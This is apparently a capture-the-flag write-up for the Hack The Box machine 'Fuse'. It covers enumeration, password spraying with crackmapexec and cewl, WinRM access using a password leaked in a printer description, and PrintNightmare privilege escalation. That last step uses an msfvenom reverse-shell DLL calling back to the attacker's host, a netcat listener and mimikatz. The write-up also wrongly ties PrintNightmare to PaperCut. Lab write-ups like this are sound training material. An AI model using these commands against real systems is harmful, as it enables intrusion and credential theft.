# Enumeration
```bash
Nmap scan report for 10.10.10.193
Host is up (0.033s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-14 19:10:59Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/14%Time=5EE67237%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h37m20s, deviation: 4h02m30s, median: 17m20s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2020-06-14T12:13:16-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-14T19:13:18
|_  start_date: 2020-06-13T20:04:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 273.83 seconds
```
**SMB:** </br>
Tried ```crackmapexec smb 10.10.10.193``` , ```smbmap -H 10.10.10.193``` But none worked. </br>
**RPC:** </br>
```bash
rpcclient -U '' -N 10.10.10.193
enumdomusers 
```

result was NT_STATUS_ACCESS_DENIED. </br>

Got into the website, was redirected to http://fuse.fabricorp.local/papercut/logs/html/index.htm, </br>
Added the machine ip to /etc/resolv.conf file and I could access the website. </br>
Tried a directory bruteforce & fuzzing scan using nikto, gobuster and dirbuster but unfortunately nothing gave me results. </br>

I got inside the website, the page is an instance of the PaperCut print logger, In each of the detailed pages, there’s metadata about the print jobs. </br>

I created a list of users based on the usernames list that were on the print jobs: </br>
```bash
pmerton
tlavel
sthompson
bhult
Administrator
```

I tried using ldapsearch to confirm the base domain of fabricorp.local with -s base namingcontexts: </br>
```ldapsearch -H ldap://10.10.10.193 -x -s base namingcontexts``` </br>

Tried going deeper with this command: </br>
```ldapsearch -H ldap://10.10.10.193 -x -b "DC=fabricorp,DC=local"``` </br>
Nothing new. </br>

**Spray for Password using crackmapexec:** </br>
I had a handful of user names from the these printer logs. The logs are also potentially a good source of target specific words that might be used as a password: </br>
I created a wordlist from the webpage using cewl: </br>
```cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > wordlist``` </br>

```crackmapexec smb 10.10.10.193 -u users -p wordlist --continue-on-success``` </br> </br>
**Results:**
```bash
[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
```

When I try to log in with smbmap again I get this: </br>
```fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE``` </br>

**Change Password:** </br>
It looks like I have valid creds, but the machine is set to require a password change. To make this change, I can use smbpasswd from Kali. I’ll run it with -r [ip], give it the old password, then a new one. </br>
but it turns out that the password resets to the default with the required change flag every minute, so I’ll need to work fast. </br>
I couldn't list the shares or enumerate them, so I tried getting into rpcclient: </br>

**RPC:** </br>
```rpcclient -U tlavel -p -N 10.10.10.193``` </br>
```Password: Fabricorp01``` </br>

querydispinfo -> get a list of users and some basic details </br>
Given the theme of the box, I also enumerated printers: </br>
```bash
Enumprinters
description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
```

I tried this password for all of the users I got from querydispinfo (I created a new list of users and used this command: ```cat users | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users```) </br>
```crackmapexec winrm 10.10.10.193 -u users -p '$fab@s3Rv1ce$1' --continue-on-success``` </br>
And I found the suitable user: svc-print </br>
```evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'``` </br>
And user.txt: ```C:\Users\svc-print\desktop> type user.txt``` </br>

# Privilege Escalation
I found out that Papercut print logger was vulnerable to [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) (Print Nightmare): </br>
I checked if it's vulnerable to that using msfconsole: </br>
```bash
	use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
set RHOSTS 10.10.10.193
set SMBUser svc-print 
set SMBPass $fab@s3Rv1ce$1 
set DLL_PATH /
exploit
```

**Result: The target is vulnerable** </br> </br>
I created a malicious DLL file which would run as an administrator: </br>
```msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.32 lport=1234 -f dll -o evil.dll```
And used this method: </br>
Opened a netcat listener on my kali: ```nc -nlvp 1234``` </br>
Transferred mimikatz.exe to the target machine, opened cmd and ran it: </br>
```misc::printnightmare /library:\\10.10.14.32\kali\evil.dll /authuser:svc-print /authpassword:$fab@s3Rv1ce$1 /try:50``` </br>
And it worked: </br>
```bash
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\programdata>whoami
nt authority\system
```

For more information about the Print Nightmare exploit, Read this blog: https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/ </br>



